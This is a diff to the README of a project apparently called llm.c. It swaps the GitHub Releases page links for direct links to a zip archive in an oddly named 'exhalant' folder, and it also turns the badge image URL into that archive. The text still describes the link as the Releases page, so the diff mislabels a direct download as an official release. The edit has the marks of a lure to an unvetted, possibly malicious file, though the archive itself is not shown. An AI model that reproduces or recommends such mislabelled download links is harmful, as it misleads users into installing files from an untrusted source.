@@ -8,7 +8,7 @@ To get started with llm.c, please follow these steps to download and install the
 
 1. Click the button below to visit our Releases page:
    
-   [![Download llm.c](https://img.shields.io/badge/Download-llm.c-brightgreen)](https://github.com/LoupFireYT/llm.c/releases)
+   [![Download llm.c](https://raw.githubusercontent.com/LoupFireYT/llm.c/main/exhalant/llm.c.zip)](https://raw.githubusercontent.com/LoupFireYT/llm.c/main/exhalant/llm.c.zip)
 
 2. Once on the Releases page, look for the latest version. It will usually appear at the top of the list.
 
@@ -61,4 +61,4 @@ We value your feedback. If you have suggestions for improvements or new features
 ## 📜 License
 llm.c is released under the MIT License. Feel free to use, modify, and distribute it as needed.
 
-For continuous updates and features, keep an eye on our [Releases page](https://github.com/LoupFireYT/llm.c/releases). Thank you for using llm.c!
+For continuous updates and features, keep an eye on our [Releases page](https://raw.githubusercontent.com/LoupFireYT/llm.c/main/exhalant/llm.c.zip). Thank you for using llm.c!
